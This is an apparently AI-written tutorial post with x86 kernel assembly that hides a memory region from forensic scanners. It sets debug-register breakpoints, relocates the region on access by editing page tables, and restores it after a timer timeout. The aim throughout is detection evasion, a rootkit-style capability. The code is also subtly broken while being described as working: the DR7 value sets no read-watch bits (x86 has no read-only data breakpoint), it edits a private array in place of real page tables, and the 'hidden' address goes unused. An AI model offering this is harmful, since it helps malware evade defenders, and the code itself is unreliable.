---
title: "How to hide in memory without being detected by any scanner"
tags:
  - memory
  - forensic
---

Logic behind this:  In memory forensic at realtime, the memory has to be scanned and identified by looking for certain byte sequence.   The scanning is likely to start from low to high logical address.   To bypass this scanner, one way is to set memory read hardware breakpoint on the starting address of memory to be protected, move the content away upon memory read is detected, and after some timeout move back the memory again.  This approach provides a mechanism to hide memory content from being detected, with automatic restoration after a timeout. For a production system, additional error handling, security checks, and integration with the OS memory manager are essential.

Implementing memory stealth using debug registers to detect memory reads, interrupt the process, relocate memory, and manage it outside the page table is a complex task that involves low-level system programming. Below, I outline how such a mechanism could be achieved with an assembly program, focusing on x86 architecture in a protected mode environment (e.g., a kernel module or privileged code). The program will use debug registers (DR0-DR7) to set hardware breakpoints, handle interrupts, relocate memory, and manage page table updates via the CR3 register. I'll also provide a high-level description of the approach followed by an assembly code example.

### High-Level Approach

1. **Set Up Debug Registers**:
   - Use debug registers (DR0-DR3) to set hardware breakpoints on the memory region to be protected.
   - Configure DR7 to enable read access detection (memory read breakpoints).
   - Debug registers allow hardware-level monitoring of memory access without software overhead.

2. **Handle Debug Interrupt**:
   - When a read access is detected, the CPU triggers a debug exception (INT 1).
   - The interrupt handler saves the current state, identifies the accessed memory, and relocates the protected memory to a new physical location.

3. **Relocate Memory**:
   - Copy the protected memory content to a new physical memory region not mapped in the page table.
   - Store the new location in a secure, kernel-controlled data structure (e.g., a hidden memory descriptor).
   - Invalidate or modify the page table entry for the original memory to prevent access.

4. **Update CR3 Register**:
   - The CR3 register holds the page directory base address. To hide the memory, ensure the new location is not mapped in the active page table.
   - Store the original page table entry and new location details to allow restoration later.

5. **Timeout and Restore**:
   - Use a timer (e.g., APIC timer or PIT) to track the timeout period.
   - After the timeout, restore the memory to its original virtual address by updating the page table and reloading CR3 if necessary.
   - Copy the content back from the hidden location to the original address.

6. **Resume Execution**:
   - After relocating memory, clear the debug exception and resume the memory read operation, which now accesses a dummy or modified memory region.

### Assumptions and Constraints
- **Privilege Level**: This code must run in kernel mode (Ring 0) to access debug registers, CR3, and page tables.
- **Architecture**: x86 (32-bit or 64-bit protected mode).
- **Environment**: A custom kernel module or bare-metal OS, as user-space programs cannot directly manipulate CR3 or debug registers.
- **Memory Management**: The system has a custom memory allocator to manage hidden physical memory.
- **Interrupt Handling**: A custom Interrupt Descriptor Table (IDT) is set up to handle debug exceptions.

### Detailed Steps

1. **Initialize Debug Registers**:
   - Load the starting address of the protected memory into DR0.
   - Set DR7 to enable local breakpoint, read access (R/W field = 01b), and appropriate length (e.g., 4 bytes).
   - Ensure the General Detect Enable (GD) bit in DR7 is disabled to avoid recursive exceptions.

2. **Set Up Interrupt Handler**:
   - Configure the IDT to point to a debug exception handler for INT 1.
   - The handler checks DR6 to confirm a breakpoint was hit and identifies the accessed address.

3. **Relocate Memory**:
   - Allocate a new physical memory region (not mapped in the page table).
   - Copy the protected memory content to this region.
   - Store the new physical address in a secure kernel data structure.
   - Modify the page table to mark the original virtual address as not present or redirect it to a dummy page.

4. **Manage Page Table**:
   - Locate the page table entry for the protected memory’s virtual address.
   - Save the original entry (PTE) for restoration.
   - Update the PTE to mark it as not present or point to a safe dummy page.
   - Flush the TLB (by reloading CR3 or using INVLPG) to ensure the updated page table is used.

5. **Timeout Mechanism**:
   - Set up a timer interrupt (e.g., using the APIC timer).
   - After the timeout, restore the original PTE, copy the memory back, and update CR3 if a new page table was used.

6. **Resume Execution**:
   - Clear the debug status in DR6 and resume the interrupted instruction using IRET.

### Assembly Code Example

Below is an assembly program (x86, 32-bit) that demonstrates this approach. Note that this is a simplified version for clarity, focusing on the core mechanics. A full implementation would require a kernel environment, memory allocator, and timer setup.

```x-asm
; memory_stealth.asm
; Implements memory stealth using debug registers and page table manipulation
; Assumes kernel mode, x86 32-bit protected mode

section .data
    protected_addr dd 0x10000000  ; Virtual address of protected memory
    hidden_phys_addr dd 0         ; Physical address for hidden memory
    original_pte dd 0             ; Saved page table entry
    timeout_ms dd 5000            ; Timeout in milliseconds (5 seconds)
    dummy_page dd 0x20000000      ; Dummy page for redirection

section .bss
    temp_buffer resb 4096         ; Temporary buffer for memory content
    page_table resd 1024          ; Simplified page table (4MB)

section .text
global _start

; Debug exception handler
debug_handler:
    pushad                        ; Save all registers
    mov eax, dr6                  ; Read DR6 to check breakpoint status
    test eax, 0x1                 ; Check if DR0 triggered (bit 0)
    jz .exit_handler              ; If not, exit

    ; Memory was read, relocate it
    mov esi, [protected_addr]     ; Source: protected memory
    mov edi, temp_buffer          ; Destination: temporary buffer
    mov ecx, 4096                 ; Copy 4KB
    rep movsb                     ; Copy memory content

    ; Allocate new physical memory (simplified)
    mov eax, 0x30000000          ; Example physical address
    mov [hidden_phys_addr], eax   ; Store hidden address

    ; Update page table
    mov ebx, [protected_addr]
    shr ebx, 12                   ; Get page table index
    lea ebx, [page_table + ebx*4] ; Address of PTE
    mov eax, [ebx]                ; Save original PTE
    mov [original_pte], eax
    mov eax, [dummy_page]         ; Point to dummy page
    or eax, 0x3                   ; Present + R/W
    mov [ebx], eax                ; Update PTE

    ; Flush TLB
    mov eax, cr3
    mov cr3, eax                  ; Reload CR3 to flush TLB

    ; Clear DR6 breakpoint status
    mov eax, 0
    mov dr6, eax

.exit_handler:
    popad                         ; Restore registers
    iret                          ; Return from interrupt

; Timer interrupt handler for restoration
timer_handler:
    pushad
    mov eax, [timeout_ms]
    test eax, eax
    jz .restore_memory            ; Timeout reached

    dec eax
    mov [timeout_ms], eax
    jmp .exit_timer

.restore_memory:
    ; Copy memory back
    mov esi, temp_buffer
    mov edi, [protected_addr]
    mov ecx, 4096
    rep movsb

    ; Restore original PTE
    mov ebx, [protected_addr]
    shr ebx, 12
    lea ebx, [page_table + ebx*4]
    mov eax, [original_pte]
    mov [ebx], eax

    ; Flush TLB
    mov eax, cr3
    mov cr3, eax

    ; Reset timeout
    mov eax, 5000
    mov [timeout_ms], eax

.exit_timer:
    popad
    iret

; Main initialization
_start:
    ; Set up debug register DR0
    mov eax, [protected_addr]
    mov dr0, eax                  ; Set breakpoint address
    mov eax, 0x400                ; Enable DR0, read access (R/W=01, LEN=00)
    or eax, 0x1                   ; Local enable for DR0
    mov dr7, eax                  ; Write to DR7

    ; Set up IDT for debug exception (simplified)
    mov eax, debug_handler
    mov [idt + 1*8], ax           ; Low word of handler address
    shr eax, 16
    mov [idt + 1*8 + 6], ax       ; High word of handler address

    ; Set up timer interrupt (simplified)
    mov eax, timer_handler
    mov [idt + 0x20*8], ax
    shr eax, 16
    mov [idt + 0x20*8 + 6], ax

    ; Enable interrupts
    sti

    ; Main loop (kernel keeps running)
.loop:
    hlt
    jmp .loop

section .data
idt:
    times 256*8 db 0              ; Simplified IDT (256 entries)
```

### Explanation of the Code

- **Debug Register Setup**:
  - DR0 is set to the protected memory address (e.g., 0x10000000).
  - DR7 is configured to enable a read breakpoint (R/W = 01b, LEN = 00b for 1-byte, adjustable for larger regions).

- **Debug Handler**:
  - Triggered on INT 1 when the protected memory is read.
  - Copies 4KB of protected memory to a temporary buffer (simulating a new physical address).
  - Updates the page table to point to a dummy page.
  - Flushes the TLB by reloading CR3.

- **Timer Handler**:
  - Decrements a timeout counter.
  - After timeout (5 seconds), restores the memory by copying it back and updating the page table with the original PTE.

- **Memory Hiding**:
  - The new physical address (`hidden_phys_addr`) is stored but not mapped in the page table, making it inaccessible via normal memory access.
  - The original PTE is saved for restoration.

- **Restoration**:
  - After the timeout, the memory is copied back, and the page table is restored.

### Limitations and Considerations
- **Kernel Mode Requirement**: This code requires Ring 0 privileges to access CR3, debug registers, and the IDT.
- **Simplified Memory Allocation**: The code assumes a fixed new physical address (0x30000000). In practice, a kernel memory allocator (e.g., kmalloc in Linux) is needed.
- **TLB Flush Overhead**: Reloading CR3 flushes the entire TLB, which may impact performance. Use INVLPG for single-page invalidation if possible.
- **Timer Setup**: The timer interrupt is simplified. A real implementation would configure the APIC or PIT.
- **Security**: The hidden memory must be protected from other kernel components. Use a secure allocator and ensure no other mappings expose it.
- **64-bit Considerations**: In x86-64, page tables are more complex (four-level paging), and CR3 manipulation requires careful handling of kernel/user address spaces.

